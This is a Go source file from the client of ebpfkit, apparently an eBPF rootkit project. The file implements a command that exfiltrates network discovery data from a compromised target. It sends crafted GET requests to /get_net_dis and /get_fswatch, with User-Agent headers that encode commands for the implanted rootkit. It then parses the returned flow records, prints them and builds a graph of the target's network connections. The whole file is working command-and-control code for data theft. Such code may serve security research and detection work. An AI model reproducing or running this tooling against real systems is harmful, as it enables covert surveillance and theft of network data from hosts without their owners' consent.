/*
Copyright © 2020 GUILLAUME FOURNIER

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/

package network_discovery

import (
	"fmt"
	"io/ioutil"
	"net/http"
	"net/http/httputil"

	"github.com/sirupsen/logrus"

	"github.com/Gui774ume/ebpfkit/cmd/ebpfkit-client/run/utils"
)

type flow struct {
	saddr      string
	daddr      string
	sourcePort uint16
	destPort   uint16
	flowType   uint32
	udpCount   uint64
	tcpCount   uint64
}

func (f flow) isEmpty() bool {
	return f.saddr == "0.0.0.0" && f.daddr == "0.0.0.0" && f.sourcePort == 0 && f.destPort == 00 && f.flowType == 0 && f.udpCount == 0 && f.tcpCount == 0
}

func sendRequest(method string, route string, userAgent string) []byte {
	client := &http.Client{}
	req, err := http.NewRequest(method, route, nil)
	if err != nil {
		logrus.Fatalln(err)
	}

	req.Header.Set("User-Agent", userAgent)

	b, err := httputil.DumpRequest(req, true)
	logrus.Debugf("\n%s", utils.CleanupHost(string(b)))

	resp, err := client.Do(req)
	if err != nil {
		logrus.Fatalln(err)
	}

	defer resp.Body.Close()
	body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		logrus.Fatalln(err)
	}
	return body
}

func parseNetworkDiscoveryOutput(body []byte) ([]flow, bool) {
	var emptyCounter int
	for i, chr := range body {
		if chr == '*' {
			body[i] = 0
		}
	}

	// parse the 15 flows
	var flows []flow
	var cursor int
	for i := 0; i < 15; i++ {
		f := flow{
			saddr:      fmt.Sprintf("%d.%d.%d.%d", body[cursor], body[cursor+1], body[cursor+2], body[cursor+3]),
			daddr:      fmt.Sprintf("%d.%d.%d.%d", body[cursor+4], body[cursor+5], body[cursor+6], body[cursor+7]),
			sourcePort: utils.ByteOrder.Uint16(body[cursor+8 : cursor+10]),
			destPort:   utils.ByteOrder.Uint16(body[cursor+10 : cursor+12]),
			flowType:   utils.ByteOrder.Uint32(body[cursor+12 : cursor+16]),
			udpCount:   utils.ByteOrder.Uint64(body[cursor+16 : cursor+24]),
			tcpCount:   utils.ByteOrder.Uint64(body[cursor+24 : cursor+32]),
		}
		if f.isEmpty() {
			emptyCounter++
		} else {
			flows = append(flows, f)
		}
		cursor += 32
	}
	return flows, emptyCounter == 15
}

// SendGetNetworkDiscoveryRequest sends a request to exfiltrate network discovery data from the target system
func SendGetNetworkDiscoveryRequest(target string) error {
	var flows []flow
	var newFlows []flow
	var endOfFlows bool
	var start int
	var body []byte
	maxRequestsCount := 10
	retryCounter := 0

	for !endOfFlows {
		_ = sendRequest("GET", target+"/get_net_dis", buildNetworkDiscoveryUserAgent(start))

		// request file content
		body = []byte("{")
		retryCounter = 0
		for body[0] == '{' && retryCounter < maxRequestsCount {
			body = sendRequest("GET", target+"/get_fswatch", buildFSWatchUserAgent("/ebpfkit/network_discovery", false, false))
			retryCounter++
		}
		newFlows, endOfFlows = parseNetworkDiscoveryOutput(body)
		start += len(newFlows)
		flows = append(flows, newFlows...)
	}

	// generate graph
	logrus.Infof("Dumping collected network flows (%d):", len(flows))
	for _, f := range flows {
		fmt.Printf("%s:%d -> %s:%d (%d) UDP %dB TCP %dB\n", f.saddr, f.sourcePort, f.daddr, f.destPort, f.flowType, f.udpCount, f.tcpCount)
	}

	if err := generateGraph(flows); err != nil {
		logrus.Fatalln(err)
	}
	return nil
}
